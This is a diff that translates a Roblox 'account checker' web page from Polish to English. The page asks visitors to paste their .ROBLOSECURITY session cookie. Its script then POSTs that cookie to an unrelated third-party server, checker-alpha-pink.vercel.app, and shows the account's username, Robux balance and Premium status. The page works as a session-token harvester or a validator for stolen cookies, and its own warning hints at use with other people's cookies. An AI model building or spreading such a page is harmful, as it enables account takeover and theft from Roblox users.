@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox – dane z .ROBLOSECURITY</title>
+  <title>Roblox – Account Info from .ROBLOSECURITY</title>
   <style>
     body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
     textarea { width: 100%; height: 140px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; resize: vertical; }
@@ -15,27 +15,25 @@
   </style>
 </head>
 <body>
-
-<h2>Pobierz dane konta Roblox z cookie .ROBLOSECURITY</h2>
-<p style="color:#ffcc00; font-weight:bold;"><strong>OSTRZEŻENIE:</strong> używanie cudzych cookie jest niezgodne z regulaminem Roblox i może skutkować permanentnym banem konta</p>
-
-<textarea id="cookie" placeholder="Wklej tutaj wartość .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
+<h2>Get Roblox account details using .ROBLOSECURITY cookie</h2>
+<p style="color:#ffcc00; font-weight:bold;"><strong>WARNING:</strong> Using someone else's cookie violates Roblox ToS and may result in a permanent account ban</p>
+<textarea id="cookie" placeholder="Paste your .ROBLOSECURITY value here (without '.ROBLOSECURITY=')"></textarea>
 <br>
-<button onclick="sprawdz()">Sprawdź konto</button>
+<button onclick="checkAccount()">Check Account</button>
 <div id="result"></div>
 
 <script>
-async function sprawdz() {
+async function checkAccount() {
   const cookieVal = document.getElementById('cookie').value.trim();
   const result = document.getElementById('result');
   result.innerHTML = '';
 
   if (cookieVal.length < 200) {
-    result.innerHTML = '<span class="error">Cookie wygląda na za krótkie / nieprawidłowe</span>';
+    result.innerHTML = '<span class="error">Cookie appears to be too short / invalid</span>';
     return;
   }
 
-  result.innerHTML = '<i>Trwa sprawdzanie... proszę czekać</i>';
+  result.innerHTML = '<i>Checking account... please wait</i>';
 
   try {
     const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
@@ -47,29 +45,33 @@ async function sprawdz() {
     const json = await resp.json();
 
     if (json.error) {
-      result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
+      result.innerHTML = `<span class="error">Error: ${json.error}</span>`;
       return;
     }
 
     if (json.success) {
-      const creationDate = json.created !== 'nie udało się pobrać' ? new Date(json.created).toLocaleDateString('pl-PL', { day: '2-digit', month: '2-digit', year: 'numeric' }) : '—';
+      const creationDate = json.created !== 'failed to fetch' 
+        ? new Date(json.created).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' }) 
+        : '—';
 
-      let avatarHtml = json.avatarUrl ? `<img id="avatar" src="${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=Brak+avatara';">` : '<p style="color:#ffcc00;">Nie udało się pobrać avatara</p>';
+      let avatarHtml = json.avatarUrl 
+        ? `<img id="avatar" src="${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=No+Avatar';">` 
+        : '<p style="color:#ffcc00;">Could not load avatar</p>';
 
       result.innerHTML = `
-        <span class="success">Pomyślnie zweryfikowano!</span><br><br>
+        <span class="success">Account successfully verified!</span><br><br>
         ${avatarHtml}
-        <b>Nazwa użytkownika:</b> ${json.username}<br>
+        <b>Username:</b> ${json.username}<br>
         <b>Display Name:</b> ${json.displayName}<br>
         <b>User ID:</b> ${json.userId}<br>
-        <b>Roblox Premium:</b> <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.hasPremium ? 'TAK ✓' : 'NIE ✗'}</span><br>
-        <b>Robux na koncie:</b> <span style="color: #ffcc00; font-weight: bold;">${json.robux.toLocaleString('pl-PL')} Robux</span><br>
-        <b>Wiek konta:</b> <span style="color: #ffcc00; font-weight: bold;">${json.accountAgeDays} dni</span><br>
-        <b>Data założenia:</b> ${creationDate} ${json.created !== 'nie udało się pobrać' ? `<small>(${json.created.split('T')[0]})</small>` : ''}<br>
+        <b>Roblox Premium:</b> <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
+        <b>Robux balance:</b> <span style="color: #ffcc00; font-weight: bold;">${json.robux.toLocaleString('en-US')} Robux</span><br>
+        <b>Account age:</b> <span style="color: #ffcc00; font-weight: bold;">${json.accountAgeDays} days</span><br>
+        <b>Created on:</b> ${creationDate} ${json.created !== 'failed to fetch' ? `<small>(${json.created.split('T')[0]})</small>` : ''}<br>
       `;
     }
   } catch (e) {
-    result.innerHTML = `<span class="error">Błąd połączenia: ${e.message}</span>`;
+    result.innerHTML = `<span class="error">Connection error: ${e.message}</span>`;
   }
 }
 </script>
